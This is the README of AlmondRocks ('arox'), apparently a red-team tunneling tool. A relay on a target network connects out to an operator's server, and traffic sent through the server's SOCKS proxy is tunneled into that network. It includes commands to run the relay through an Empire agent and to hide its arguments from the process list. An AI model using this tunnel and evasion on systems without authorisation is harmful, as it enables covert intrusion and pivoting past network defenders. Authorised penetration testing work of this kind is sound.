# AlmondRocks
AlmondRocks ("arox") is a tunneling tool that connects out from a target network and provides a (limited) SOCKSv5 interface. The tunnel connection is currently a binary protocol under TLS.

This tool is currently in BETA. The biggest known issue at the moment is lack of tunnel peer authentication.

## Requirements
- Python 2.7

## Components

#### Server
The `server` receives tunnel connections and opens a SOCKS proxy port.

#### Relay
The `relay` connects out from target to a `server`. All subsequent traffic proxied through the SOCKS port on the server will be tunneled through the target.

## Usage

#### Server (standalone)

The `-h` flag shows a help menu. Listen on 443/tcp for tunnel connections, and listen on 1080/tcp for SOCKS clients:

```
python arox.py -v server --tunnel-addr 0.0.0.0:443 --socks-addr 127.0.0.1:1080 --cert ssl/cert.pem --key ssl/key.pem
```

#### Server (Docker)

The server is Dockerized for convenience. To use **default certs** (not recommended):

``` bash
[root]# docker pull klustic/arox:latest
[root]# docker run --rm -it -p 1080:1080 -p 443:4433 --name arox klustic/arox
```

To override the default certs, mount a volume from a directory containing `cert.pem` and `key.pem`:

``` bash
[root]# docker pull klustic/arox:latest
[root]# docker run --rm -it -p 1080:1080 -p 443:4433 --name arox -v $(pwd)/ssl:/opt/arox/ssl:ro klustic/arox
```

#### Relay (standalone)

The `-h` flag shows a help menu. Connect to master at 10.0.0.10:443:

```
python arox.py -v relay --tunnel-addr 10.0.0.10:443
```

#### Relay (Empire)

First, setup your AROX server (see above). Once you have an Empire agent connected, issues the following commands to Empire:

```
agents
interact <sessionId>
usemodule management/multi/socks
set server <AROX server IP/domain>:<AROX server port>
info
execute
```

NOTE: AROX v1.0.0 broke compatibility with previous versions. The current version is not merged into EmpireProject yet. To use the current version, issue this command before starting Empire:

``` bash
cp -rv Empire/* /opt/Empire/   ## Or wherever you have installed Empire
```

## Advanced Usage

In some cases you may want to hide commandline options in the process list. AROX supports passing arguments via stdin on the command line:

```
echo -v relay --tunnel-addr 10.0.0.10:443 | python arox.py
```

Looks like this in the process list:

```
[root@testing-c67 arox]# echo -v relay --tunnel-addr 10.0.0.10:443 | python2.7 arox.py
[-] Checking for options on stdin...
[+] Options received
[2018-05-15 14:39:36]     INFO SocksRelay: Connected to 10.0.0.10:443
...
[root@testing-c67 arox]# bg
[root@testing-c67 arox]# ps -ef --forest
...
root       1585   1584  0 14:04 pts/0    00:00:00                  \_ /bin/bash
root       1676   1585  0 14:39 pts/0    00:00:00                      \_ python2.7 arox.py
root       1677   1585  0 14:39 pts/0    00:00:00                      \_ ps -ef --forest
```

## Listing active connections through the AROX tunnel

There is an easter egg that lists all connections that are opened via arox tunnel. Press `CTRL-\` on the arox server terminal to view statistics.

```
...
[2018-05-15 19:43:34]     INFO Tunnel: Closed channel: <Channel id=304960167 remote_addr=www.pandora.com[208.85.40.50]:443 local_addr=127.0.0.1:56896>
[2018-05-15 19:43:34]     INFO Tunnel: Closed channel: <Channel id=304960168 remote_addr=www.pandora.com[208.85.40.20]:443 local_addr=127.0.0.1:56898>
^\[2018-05-15 19:43:42]  WARNING SocksServer:
[2018-05-15 19:43:42]  WARNING SocksServer: ~~~ Stats for nerds : 5 open channels, tunnel peer is 10.0.0.11:60814 ~~~
[2018-05-15 19:43:42]  WARNING SocksServer:   <Channel id=304960141 remote_addr=www.pandora.com[208.85.40.20]:443 local_addr=127.0.0.1:56844>
[2018-05-15 19:43:42]  WARNING SocksServer:   <Channel id=304960142 remote_addr=lt500.tritondigital.com[54.243.169.218]:443 local_addr=127.0.0.1:56846>
[2018-05-15 19:43:42]  WARNING SocksServer:   <Channel id=304960143 remote_addr=stats.pandora.com[208.85.40.147]:443 local_addr=127.0.0.1:56848>
[2018-05-15 19:43:42]  WARNING SocksServer:   <Channel id=304960145 remote_addr=adserver.pandora.com[208.85.40.115]:443 local_addr=127.0.0.1:56852>
[2018-05-15 19:43:42]  WARNING SocksServer:   <Channel id=304960146 remote_addr=adserver.pandora.com[208.85.40.115]:443 local_addr=127.0.0.1:56854>
[2018-05-15 19:43:42]  WARNING SocksServer: ~~~ End of Stats ~~~
...
```
